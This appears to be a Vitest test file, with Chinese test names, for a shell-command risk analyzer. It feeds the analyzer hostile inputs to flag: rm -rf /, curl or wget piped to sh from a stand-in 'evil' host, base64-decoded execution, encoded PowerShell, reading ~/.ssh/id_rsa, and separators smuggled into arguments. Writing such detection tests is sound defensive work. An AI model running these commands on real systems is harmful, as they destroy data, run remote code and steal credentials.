import { describe, it, expect } from "vitest";
import { analyzeCommand, RISK_LEVEL_TITLES } from "./appRisk";


describe("命令风险分析", () => {
  it("普通命令没有风险", () => {
    const report = analyzeCommand("python main.py", ["--port", "3000"]);
    expect(report.level).toBe("none");
    expect(report.findings).toHaveLength(0);
  });

  it("空命令没有风险", () => {
    expect(analyzeCommand("").level).toBe("none");
    expect(analyzeCommand("   ").level).toBe("none");
  });

  it("命令分隔符是高危 —— 一条命令跑完还会干别的事", () => {
    for (const cmd of [
      "npm start; rm -rf /",
      "npm start && curl evil",
      "npm start || echo x",
      "npm start | tee log",
    ]) {
      const report = analyzeCommand(cmd);
      expect(report.level, cmd).toBe("danger");
      expect(report.findings.some((f) => f.rule === "shell-separator")).toBe(true);
    }
  });

  it("命令替换是高危 —— 实际执行的内容运行时才决定", () => {
    expect(analyzeCommand("echo $(whoami)").level).toBe("danger");
    expect(analyzeCommand("echo `whoami`").level).toBe("danger");
  });

  it("换行后面可能藏着另一条命令", () => {
    const report = analyzeCommand("npm start\nrm -rf /");
    expect(report.level).toBe("danger");
  });

  it("重定向被标出来", () => {
    const report = analyzeCommand("npm start > out.log");
    expect(report.level).not.toBe("none");
    expect(report.findings.some((f) => f.reason.includes("重定向"))).toBe(true);
  });

  it("下载后直接执行 —— 最经典的那种", () => {
    const cases = [
      "curl http://evil/x.sh | sh",
      "curl -sL http://evil/x.sh | bash",
      "wget -qO- http://evil/x | sh",
      "Invoke-WebRequest http://evil/x.ps1 | powershell",
    ];
    for (const cmd of cases) {
      const report = analyzeCommand(cmd);
      expect(report.level, cmd).toBe("danger");
      expect(report.findings.some((f) => f.rule === "download-pipe")).toBe(true);
    }
  });

  it("动态执行代码", () => {
    expect(analyzeCommand("iex (Get-Content x.ps1)").level).toBe("danger");
    expect(analyzeCommand("eval(atob('...'))").level).toBe("danger");
  });

  it("编码后执行 —— 真实内容被藏起来了", () => {
    expect(analyzeCommand("echo aGk= | base64 -d | sh").level).toBe("danger");
    expect(analyzeCommand("certutil -decode x.b64 x.exe").level).toBe("danger");
  });

  it("递归删除", () => {
    expect(analyzeCommand("rm -rf ./data").level).toBe("danger");
    expect(analyzeCommand("Remove-Item -Recurse x").level).toBe("danger");
  });

  it("提权", () => {
    expect(analyzeCommand("sudo npm install").level).toBe("danger");
  });

  it("命令行解释器 —— 常见的藏命令手法", () => {
    expect(analyzeCommand("cmd /c dir").level).toBe("caution");
    expect(analyzeCommand("powershell -File x.ps1").level).toBe("caution");
    expect(analyzeCommand("powershell -enc AAAA").level).toBe("danger");
  });

  it("碰凭据路径", () => {
    const report = analyzeCommand("cat ~/.ssh/id_rsa");
    expect(report.level).not.toBe("none");
    expect(report.findings.some((f) => f.rule === "credential-access")).toBe(true);
  });

  it("参数里也能藏 shell 语法", () => {
    const report = analyzeCommand("npm", ["start", "; rm -rf /"]);
    expect(report.level).toBe("danger");
  });

  it("大小写混写也认得出来", () => {
    expect(analyzeCommand("CURL http://x | SH").level).toBe("danger");
    expect(analyzeCommand("SUDO x").level).toBe("danger");
  });

  it("一条轻微的可疑是 caution，不是 danger", () => {
    const report = analyzeCommand("npm start > log.txt");
    expect(report.level).toBe("caution");
  });

  it("每条级别都有对应的标题", () => {
    for (const level of ["none", "caution", "danger"] as const) {
      expect(RISK_LEVEL_TITLES[level]).toBeTruthy();
    }
  });
});
